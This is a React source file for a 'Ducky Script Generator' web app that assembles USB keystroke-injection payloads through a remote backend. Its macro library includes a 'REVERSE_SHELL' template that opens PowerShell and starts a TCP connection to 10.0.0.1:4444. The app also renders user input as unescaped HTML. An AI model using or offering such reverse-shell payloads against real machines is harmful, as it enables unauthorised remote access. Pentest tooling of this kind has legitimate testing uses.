import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Download, Copy, Clock, Shield, Lock, Globe, Zap, Check } from 'lucide-react';
import { Toaster, toast } from 'sonner';
import './app.css';

interface HistoryItem {
  id: string;
  timestamp: string;
  name: string;
  script: string;
}

interface MacroTemplate {
  name: string;
  icon: any;
  template: string;
}

const macroTemplates: MacroTemplate[] = [
  {
    name: 'OPEN_BROWSER',
    icon: Globe,
    template: 'GUI r\nDELAY 500\nSTRING chrome.exe\nENTER\nDELAY 1000\nSTRING https://example.com\nENTER'
  },
  {
    name: 'LOCK_SCREEN',
    icon: Lock,
    template: 'GUI l\nDELAY 100'
  },
  {
    name: 'REVERSE_SHELL',
    icon: Shield,
    template: 'GUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING $client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)\nENTER'
  }
];

export default function App() {
  const [inputScript, setInputScript] = useState('');
  const [outputScript, setOutputScript] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [progress] = useState(0);
  const [history, setHistory] = useState<HistoryItem[]>([
    {
      id: '1',
      timestamp: '14:32:15',
      name: 'Lock Screen',
      script: 'GUI l\nDELAY 100'
    },
    {
      id: '2',
      timestamp: '14:28:09',
      name: 'Browser Launch',
      script: 'GUI r\nDELAY 500\nSTRING chrome.exe\nENTER'
    }
  ]);
  const [copied, setCopied] = useState(false);
  const [downloading, setDownloading] = useState(false);
  const [downloadProgress, setDownloadProgress] = useState(0);
  const outputRef = useRef<HTMLDivElement>(null);
  const [titleText, setTitleText] = useState('');
  const fullTitle = 'DUCKY SCRIPT GENERATOR';

  // Typing animation for title
  useEffect(() => {
    let i = 0;
    const timer = setInterval(() => {
      if (i <= fullTitle.length) {
        setTitleText(fullTitle.slice(0, i));
        i++;
      } else {
        clearInterval(timer);
      }
    }, 100);
    return () => clearInterval(timer);
  }, []);

  const highlightSyntax = (text: string) => {
    const keywords = ['STRING', 'DELAY', 'GUI', 'ENTER', 'CONTROL', 'ALT', 'SHIFT', 'ESC', 'TAB'];
    let highlighted = text;
    keywords.forEach(keyword => {
      const regex = new RegExp(`\\b${keyword}\\b`, 'g');
      highlighted = highlighted.replace(regex, `<span class="keyword">${keyword}</span>`);
    });
    return highlighted;
  };

const generatePayload = async () => {
  if (!inputScript.trim()) {
    toast.error("Please enter a script first!");
    return;
  }

  setIsGenerating(true);

  try {
    const res = await fetch("https://rubber-ducky-generator.onrender.com/generate", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ script: inputScript }),
    });

    const data: { output: string } = await res.json();

    setOutputScript(data.output);

    // add to history
    const newItem: HistoryItem = {
      id: Date.now().toString(),
      timestamp: new Date().toLocaleTimeString("en-US", { hour12: false }),
      name: `Payload ${history.length + 1}`,
      script: inputScript,
    };

    setHistory((prev) => [newItem, ...prev.slice(0, 9)]);

    toast.success("Payload generated successfully!");
  } catch (error) {
    toast.error("Backend connection failed!");
  }

  setIsGenerating(false);
};

  const copyToClipboard = async () => {
    if (!outputScript) {
      toast.error('No output to copy!', {
        style: {
          background: 'rgba(255, 0, 0, 0.1)',
          border: '1px solid rgba(255, 0, 0, 0.5)',
          color: '#ff0044',
          backdropFilter: 'blur(12px)'
        }
      });
      return;
    }

    await navigator.clipboard.writeText(outputScript);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    
    toast.success('Copied to clipboard!', {
      style: {
        background: 'rgba(0, 255, 136, 0.1)',
        border: '1px solid rgba(0, 255, 136, 0.5)',
        color: '#00ff88',
        backdropFilter: 'blur(12px)'
      }
    });
  };

  const downloadScript = async () => {
    if (!outputScript) {
      toast.error('No output to download!', {
        style: {
          background: 'rgba(255, 0, 0, 0.1)',
          border: '1px solid rgba(255, 0, 0, 0.5)',
          color: '#ff0044',
          backdropFilter: 'blur(12px)'
        }
      });
      return;
    }

    setDownloading(true);
    setDownloadProgress(0);

    // Simulate download progress
    const timer = setInterval(() => {
      setDownloadProgress(prev => {
        if (prev >= 100) {
          clearInterval(timer);
          return 100;
        }
        return prev + 20;
      });
    }, 100);

    setTimeout(() => {
      const blob = new Blob([outputScript], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'ducky_script.txt';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      
      setDownloading(false);
      setDownloadProgress(0);
      
      toast.success('Downloaded successfully!', {
        style: {
          background: 'rgba(0, 255, 136, 0.1)',
          border: '1px solid rgba(0, 255, 136, 0.5)',
          color: '#00ff88',
          backdropFilter: 'blur(12px)'
        }
      });
    }, 600);
  };

  const insertMacro = (template: string, name: string) => {
    setInputScript(prev => prev + (prev ? '\n\n' : '') + template);
    toast.success(`${name} inserted!`, {
      style: {
        background: 'rgba(0, 255, 136, 0.1)',
        border: '1px solid rgba(0, 255, 136, 0.5)',
        color: '#00ff88',
        backdropFilter: 'blur(12px)'
      }
    });
  };

  const reuseScript = (script: string, name: string) => {
    setInputScript(script);
    toast.success(`${name} loaded!`, {
      style: {
        background: 'rgba(0, 255, 136, 0.1)',
        border: '1px solid rgba(0, 255, 136, 0.5)',
        color: '#00ff88',
        backdropFilter: 'blur(12px)'
      }
    });
  };

  return (
    <div className="app-container">
      <Toaster position="bottom-right" />
      
      {/* Animated background */}
      <div className="circuit-pattern" />
      <div className="particles-container">
        {[...Array(20)].map((_, i) => (
          <motion.div
            key={i}
            className="particle"
            animate={{
              y: [0, -1000],
              opacity: [0, 1, 0]
            }}
            transition={{
              duration: Math.random() * 10 + 10,
              repeat: Infinity,
              delay: Math.random() * 5,
              ease: 'linear'
            }}
            style={{
              left: `${Math.random() * 100}%`,
            }}
          />
        ))}
      </div>

      <div className="content-wrapper">
        {/* Header */}
        <motion.header 
          className="header"
          initial={{ opacity: 0, y: -50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
        >
          <div className="title-container">
            <motion.h1 
              className="main-title"
              animate={{
                textShadow: [
                  '0 0 20px rgba(0, 255, 136, 0.5), 0 0 40px rgba(0, 255, 136, 0.3)',
                  '0 0 30px rgba(0, 255, 136, 0.8), 0 0 60px rgba(0, 255, 136, 0.4)',
                  '0 0 20px rgba(0, 255, 136, 0.5), 0 0 40px rgba(0, 255, 136, 0.3)',
                ]
              }}
              transition={{ duration: 2, repeat: Infinity }}
            >
              {titleText}
              <span className="cursor-blink">_</span>
            </motion.h1>
            <div className="scan-line" />
          </div>
          <motion.p 
            className="subtitle"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 2, duration: 0.5 }}
          >
            Automate USB Payloads
          </motion.p>
        </motion.header>

        {/* Main Grid */}
        <div className="main-grid">
          {/* Left Panel - Input Script */}
          <motion.div 
            className="glass-panel"
            initial={{ opacity: 0, x: -50 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.3, duration: 0.5 }}
          >
            <div className="panel-header">
              <Terminal className="panel-icon" />
              <h2>INPUT SCRIPT</h2>
            </div>
            <div className="input-container">
              <textarea
                className="script-input"
                value={inputScript}
                onChange={(e) => setInputScript(e.target.value)}
                placeholder="Enter Ducky Script or Macros (e.g. OPEN_POWERSHELL...)"
                spellCheck={false}
              />
              <div 
                className="syntax-overlay"
                dangerouslySetInnerHTML={{ __html: highlightSyntax(inputScript) }}
              />
            </div>
          </motion.div>

          {/* Center Action Area */}
          <motion.div 
            className="action-center"
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.5, duration: 0.5 }}
          >
            <motion.button
              className="generate-button"
              onClick={generatePayload}
              disabled={isGenerating}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.96 }}
              animate={{
                boxShadow: isGenerating 
                  ? 'none'
                  : [
                    '0 0 30px rgba(0, 255, 136, 0.4)',
                    '0 0 50px rgba(0, 255, 136, 0.6)',
                    '0 0 30px rgba(0, 255, 136, 0.4)',
                  ]
              }}
              transition={{ duration: 2, repeat: Infinity }}
            >
              {isGenerating ? (
                <>
                  <svg className="progress-ring" viewBox="0 0 100 100">
                    <circle
                      className="progress-ring-circle"
                      cx="50"
                      cy="50"
                      r="45"
                      strokeDasharray={`${progress * 2.827} 283`}
                    />
                  </svg>
                  <span>GENERATING...</span>
                </>
              ) : (
                <>
                  <Zap className="button-icon" />
                  <span>GENERATE PAYLOAD</span>
                </>
              )}
            </motion.button>

            <div className="secondary-actions">
              <motion.button
                className="secondary-button"
                onClick={downloadScript}
                disabled={downloading || !outputScript}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.96 }}
              >
                {downloading ? (
                  <>
                    <div className="download-progress" style={{ width: `${downloadProgress}%` }} />
                    <Download className="button-icon" />
                    <span>{downloadProgress}%</span>
                  </>
                ) : (
                  <>
                    <Download className="button-icon" />
                    <span>Download .txt</span>
                  </>
                )}
              </motion.button>

              <motion.button
                className="secondary-button"
                onClick={copyToClipboard}
                disabled={!outputScript}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.96 }}
              >
                <AnimatePresence mode="wait">
                  {copied ? (
                    <motion.div
                      key="check"
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      exit={{ scale: 0 }}
                      className="button-content"
                    >
                      <Check className="button-icon" />
                      <span>Copied!</span>
                    </motion.div>
                  ) : (
                    <motion.div
                      key="copy"
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      exit={{ scale: 0 }}
                      className="button-content"
                    >
                      <Copy className="button-icon" />
                      <span>Copy to Clipboard</span>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.button>
            </div>
          </motion.div>

          {/* Right Panel - Output Stream */}
          <motion.div 
            className="glass-panel"
            initial={{ opacity: 0, x: 50 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.3, duration: 0.5 }}
          >
            <div className="panel-header">
              <Terminal className="panel-icon" />
              <h2>OUTPUT STREAM</h2>
            </div>
            <div className="output-container" ref={outputRef}>
              <div className="line-numbers">
                {outputScript.split('\n').map((_, i) => (
                  <div key={i} className="line-number">{i + 1}</div>
                ))}
              </div>
              <div className="output-content">
                <AnimatePresence>
                  {outputScript.split('\n').map((line, i) => (
                    <motion.div
                      key={i}
                      className="output-line"
                      initial={{ opacity: 0, x: -10 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ duration: 0.2 }}
                    >
                      {line || '\u00A0'}
                    </motion.div>
                  ))}
                </AnimatePresence>
                {outputScript && (
                  <motion.span
                    className="terminal-cursor"
                    animate={{ opacity: [1, 0] }}
                    transition={{ duration: 0.8, repeat: Infinity }}
                  >
                    ▊
                  </motion.span>
                )}
              </div>
            </div>
          </motion.div>
        </div>

        {/* Bottom Section */}
        <div className="bottom-grid">
          {/* Payload History */}
          <motion.div 
            className="glass-panel history-panel"
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.6, duration: 0.5 }}
          >
            <div className="panel-header">
              <Clock className="panel-icon" />
              <h3>PAYLOAD HISTORY</h3>
            </div>
            <div className="history-list">
              {history.map((item, index) => (
                <motion.div
                  key={item.id}
                  className="history-item"
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: index * 0.1 }}
                  whileHover={{ 
                    x: 10,
                    backgroundColor: 'rgba(0, 255, 136, 0.05)'
                  }}
                >
                  <div className="history-info">
                    <span className="history-time">{item.timestamp}</span>
                    <span className="history-name">{item.name}</span>
                  </div>
                  <motion.button
                    className="reuse-button"
                    onClick={() => reuseScript(item.script, item.name)}
                    whileHover={{ scale: 1.1 }}
                    whileTap={{ scale: 0.95 }}
                  >
                    Reuse
                  </motion.button>
                </motion.div>
              ))}
            </div>
          </motion.div>

          {/* Macro Library */}
          <motion.div 
            className="glass-panel macro-panel"
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.7, duration: 0.5 }}
          >
            <div className="panel-header">
              <Shield className="panel-icon" />
              <h3>MACRO LIBRARY</h3>
            </div>
            <div className="macro-list">
              {macroTemplates.map((macro, index) => {
                const Icon = macro.icon;
                return (
                  <motion.button
                    key={macro.name}
                    className="macro-button"
                    onClick={() => insertMacro(macro.template, macro.name)}
                    initial={{ opacity: 0, scale: 0.8 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: 0.8 + index * 0.1 }}
                    whileHover={{ 
                      scale: 1.05,
                      boxShadow: '0 0 20px rgba(0, 255, 136, 0.6)'
                    }}
                    whileTap={{ 
                      scale: 0.95,
                      backgroundColor: 'rgba(0, 255, 136, 0.2)'
                    }}
                  >
                    <Icon className="macro-icon" />
                    <span>{macro.name}</span>
                  </motion.button>
                );
              })}
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
}
